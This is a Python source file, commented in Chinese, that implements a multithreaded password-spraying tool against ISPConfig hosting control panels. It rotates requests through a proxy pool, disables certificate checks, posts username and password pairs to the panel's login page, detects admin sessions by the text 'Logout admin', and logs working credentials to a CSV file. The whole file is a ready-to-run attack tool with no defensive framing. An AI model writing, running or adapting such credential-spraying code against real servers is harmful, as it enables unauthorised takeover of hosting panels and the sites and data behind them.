#!/usr/bin/env python
# ispconfig_plugin.py
# ISPConfig 密碼噴灑插件 (多執行緒 + Proxy Pool + Logger 支援)

import logging
import requests
import csv
import os
import random
from datetime import datetime
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from urllib.parse import urlparse, urlunparse

# 關閉 SSL 警告
requests.packages.urllib3.disable_warnings()

class ISPConfigBruteForcePlugin:
    def __init__(self, threads=5, timeout=10, debug=False, proxy=None, proxy_pool=None, logger=None):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.logger = logger or self.setup_logger()
        self.lock = Lock()
    
    def normalize_target_url(self, target, port, scheme="http"):
        if target.startswith("http"):
            return target
        else:
            return f"{scheme}://{target}:{port}"

    def setup_logger(self):
        logger = logging.getLogger("ispconfig")
        logger.setLevel(logging.DEBUG if self.debug else logging.INFO)
        if logger.hasHandlers():
            logger.handlers.clear()

        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        log_dir = "logs"
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, f"ispconfig_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setFormatter(formatter)
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)

        logger.addHandler(file_handler)
        logger.addHandler(console_handler)
        return logger

    def get_proxy(self):
        selected = random.choice(self.proxy_pool) if self.proxy_pool else self.proxy
        return {'http': selected, 'https': selected} if selected else None

    def determine_protocol(self, host):
        for protocol, port in [("https", 443), ("http", 80)]:
            try:
                url = f"{protocol}://{host}"
                response = requests.get(url, timeout=self.timeout, verify=False, proxies=self.get_proxy())
                if response.status_code < 400:
                    return protocol, port
            except requests.RequestException:
                continue
        return "https", 443

    def clean_target(self, target):
        parsed = urlparse(target)
        return parsed.hostname or target

    def attempt_login(self, target, port, username, password):
        target = self.clean_target(target)
        session = requests.Session()
        session.verify = False
        session.proxies = self.get_proxy() or {}
        session.cookies.clear()

        protocol, port = self.determine_protocol(target)
        login_url = f"{protocol}://{target}/login/index.php"
        data = {
            'username': username,
            'password': password,
            's_mod': 'login',
            's_pg': 'index'
        }
        try:
            response = session.post(login_url, data=data, timeout=self.timeout, allow_redirects=False)
            if response.status_code == 302:
                location = response.headers.get("Location", "")
                if location.startswith("../"):
                    redirect_url = f"{protocol}://{target}/index.php"
                else:
                    redirect_url = f"{protocol}://{target}/{location.lstrip('/')}"
                response2 = session.get(redirect_url, timeout=self.timeout)
                if "Logout admin" in response2.text:
                    return True, f"{response.status_code}"
                return False, f"{response.status_code}"
            if "Logout admin" in response.text:
                return True, f"{response.status_code}"
        except requests.RequestException as e:
            return False, str(e)
        return False, "Request_Failed"

    def write_success_csv(self, file_path, target, port, username, password, status, response_code):
        with self.lock:
            with open(file_path, 'a', newline='', encoding='utf-8') as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=["Target", "Port", "Username", "Password", "Status", "ResponseCode"])
                if csvfile.tell() == 0:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Port": port,
                    "Username": username,
                    "Password": password,
                    "Status": status,
                    "ResponseCode": response_code
                })

    def write_failure_csv(self, file_path, target, username, password, response_code, failure_reason):
        with self.lock:
            os.makedirs(os.path.dirname(file_path), exist_ok=True) 
            with open(file_path, 'a', newline='', encoding='utf-8') as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=["Target", "Username", "Password", "ResponseCode", "FailureReason"])
                if csvfile.tell() == 0:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Username": username,
                    "Password": password,
                    "ResponseCode": response_code,
                    "FailureReason": failure_reason
                })

    def process_login(self, target, port, username, password, output_file, failed_log, timeout, retries):
        original_timeout = self.timeout
        self.timeout = timeout

        target_url = self.normalize_target_url(target, port)

        success = False
        status_info = ""
        for attempt in range(retries):
            self.logger.debug(f"Attempt {attempt+1}/{retries} for {target_url} with {username}:{password}")
            success, status_info = self.attempt_login(target, port, username, password)
            if success:
                status_info = f"Success on attempt {attempt+1}"
                break
            else:
                status_info = f"Failed attempt {attempt+1}: {status_info}"

        record_msg = f"{'✅ 成功' if success else '❌ 失敗'}: {target_url} - {username}/{password} | Code: {status_info}"
        self.logger.info(record_msg) if success else self.logger.warning(record_msg)

        if success:
            self.write_success_csv(output_file, target, port, username, password, "Success", status_info)
        else:
            if failed_log:
                self.write_failure_csv(failed_log, target, username, password, status_info, status_info)
        self.timeout = original_timeout

    def run_multi_login(self, login_tasks, output_file, failed_log, timeout, retries):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for target, port, username, password in login_tasks:
                futures.append(executor.submit(
                    self.process_login,
                    target, port, username, password, output_file, failed_log, timeout, retries
                ))
            for f in tqdm(as_completed(futures), total=len(futures), desc="ISPConfig Login Attempts"):
                _ = f.result()

if __name__ == '__main__':
    proxy_list = ["http://127.0.0.1:8080", "socks5://127.0.0.1:1080"]
    plugin = ISPConfigBruteForcePlugin(
        threads=5,
        timeout=10,
        debug=True,
        proxy="http://127.0.0.1:9999",
        proxy_pool=proxy_list
    )
    plugin.process_login("example.com", 80, "admin", "password", "ispconfig_success.csv", "ispconfig_failed.csv", 5, 3)
